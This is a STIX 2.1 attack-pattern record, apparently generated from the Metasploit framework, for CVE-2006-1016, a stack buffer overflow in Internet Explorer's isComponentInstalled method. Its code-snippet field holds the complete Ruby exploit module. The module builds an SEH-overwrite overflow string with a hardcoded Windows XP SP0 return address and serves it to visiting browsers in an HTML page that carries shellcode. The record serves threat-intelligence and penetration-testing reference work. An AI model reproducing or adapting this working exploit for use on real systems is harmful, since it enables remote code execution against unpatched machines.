{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e998148-b680-448b-b611-2819a85e6d4d",
    "created": "2024-08-14T16:43:11.905757Z",
    "modified": "2024-08-14T16:43:11.90576Z",
    "name": "Microsoft Internet Explorer isComponentInstalled Overflow",
    "description": " This module exploits a stack buffer overflow in Internet Explorer. This bug was patched in Windows 2000 SP4 and Windows XP SP1 according to MSRC.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_iscomponentinstalled.rb",
            "external_id": "ie_iscomponentinstalled.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1016"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Seh\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Internet Explorer isComponentInstalled Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Internet Explorer. This bug was\n        patched in Windows 2000 SP4 and Windows XP SP1 according to MSRC.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-1016' ],\n          [ 'OSVDB', '31647' ],\n          [ 'BID', '16870' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 512,\n          'BadChars'       => \"\\x00\\x5c\\x0a\\x0d\\x22\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows XP SP0 with Internet Explorer 6.0', { 'Ret' =>  0x71ab8e4a } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-02-24'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Create the overflow string\n    pattern = rand_text_alpha(8192)\n\n    # Smash the return address with a bogus pointer\n    pattern[744, 4] = [0xffffffff].pack('V')\n\n    # Handle the exception :-)\n    seh = generate_seh_payload(target.ret)\n    pattern[6439, seh.length] = seh\n\n\n    # Build out the HTML response page\n    var_client = rand_text_alpha(rand(30)+2)\n    var_html   = rand_text_alpha(rand(30)+2)\n\n    content = %Q|\n<html>\n<head>\n  <script>\n    function window.onload() {\n      #{var_client}.style.behavior = \"url(#default#clientCaps)\";\n      #{var_client}.isComponentInstalled( \"__pattern__\" ,  \"componentid\" );\n    }\n  </script>\n</head>\n<body id=\"#{var_client}\">\n#{var_html}\n</body>\n</html>\n    |\n\n    content = Rex::Text.randomize_space(content)\n\n    # Insert the shellcode\n    content.gsub!('__pattern__', pattern)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-02-24",
    "x_mitre_platforms": [
        "win'"
    ]
}